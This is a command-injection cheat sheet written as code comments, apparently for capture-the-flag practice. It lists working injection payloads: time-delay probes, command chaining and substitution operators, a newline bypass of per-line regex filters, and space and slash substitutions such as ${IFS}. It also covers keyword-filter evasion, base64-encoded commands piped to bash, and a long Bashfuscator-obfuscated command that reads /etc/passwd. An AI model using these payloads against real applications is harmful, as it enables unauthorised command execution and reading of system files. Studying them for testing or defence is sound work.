// Command Injection
//! Identifying
//* using time delay
// we can use " & ping -c 10 127.0.0.1 & " to see if the command is executed in 10 seconds
// or " & sleep 10 "
// with # to comment the rest
//! Exploiting
//* operators
// & && ; to execture multiple commands at the same time
// | || if the first command fails the second one will be executed
// `cmd` and ${cmd} to execute a command and use its output
//* redirection
// if the application does not return the output of the command you can use > to redirect the output to a file
// that we have access to
//* out of band
// you can make the server send you a request to your server to get the result of the command
//* facing regex
// if you face "ls --${op1} ${op2}"
// and both inputs are regex restricted
// you can add a new line to op1 with %0a because regex in applied to each line separately
// you will end up with
// "ls --${op1}"
// "${op2}"
// if this is not properly protected you can add any command on op2
// because usely regex protect against special characters and normal commands does not contains special characters
// for example "cat flag"
//* filtered characters
// you can always use printenv to see all envs first
// space can be replaced with ${IFS} or %09 (tab)
// / can be replaced with ${PATH:0:1}
//* filtered cmd
// cm''d
// cm\d
// $(rev <<< dmc)
//* encoding commands
// make it with : echo -n 'cmd' | base64
// use it with : bash<<<$(base64 -d <<< ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
//* Bashfuscator
// its a tool specifically designed to obfuscate bash commands
// ex:
// 'cat /etc/passwd' =>
// ${@/l+Jau/+<b=k } p''"r"i""n$'t\u0066'  %s  "$(      ${*%%Frf\[4?T2   }  ${*##0\!j.G }   "r"'e'v <<< '   "} ~@{$"   ")  }  j@C`\7=-k#*{$   "}   ,@{$"  ; }  ;   } ,,*{$  "}]  }   ,*{$  "}   f9deh`\>6/J-F{\,vy//@{$" niOrw$   } QhwV#@{$ [NMpHySZ{$"  s%  "f"'"'"'4700u\n9600u\r'"'"'$p  {   ;  }  ~*{$  "}  48T`\PJc}\#@{$"   1#31  "}  ,@{$"   }  D$y?U%%*{$ 0#84  *$   }   Lv:sjb/@{$   2#05   }   ~@{$   2#4   }*!{$  }   OGdx7=um/X@RA{\eA/*{$ 1001#2   }   Scnw:i/@{$  } ~~*{$  11#4   "} O#uG{\HB%@{$"   11#7 "} ^^@{$"  011#2   "}   ~~@{$" 11#3 }  L[\h3m/@{$  "}   ~@{$" 11#2 }  6u1N.b!\b%%*{$   }   YCMI##@{$   31#5 "} ,@{$" 01#7  }  (\}\;]\//*{$ }   %#6j/?pg%m/*{$   001#2  "}  6IW]\p*n%@{$"   }  ^^@{$ 21#7  } !\=jy#@{$  }   tz}\k{\v1/?o:Sn@V/*{$  11#5   ni   niOrw  rof ;   "}   ,,@{$"  } MD`\!\]\P%%*{$   )  }@{$   a   }  ogt=y%*{$ "@$" /\   }   {\nZ2^##*{$    \   *$  c  }@{$  }   h;|Yeen{\/.8oAl-RY//@{$   p  *$  "}@{$"  t   }  zB(\R//*{$  } mX=XAFz_/9QKu//*{$  e   *$  s  } ~~*{$  d   }  ,*{$   }  2tgh%X-/L=a_r#f{\//*{$   w }  {\L8h=@*##@{$   "}   W9Zw##@{$"  (=NMpHySZ    ($"  la'"'"''"'"'"v"'"'"''"'"''"'"'541\'"'"'$  } &;@0#*{$ '   "${@}" "${@%%Ij\[N   }"    ${@~~  }   )"  ${!*} |   $@  $'b\u0061'''sh   ${*//J7\{=.QH   }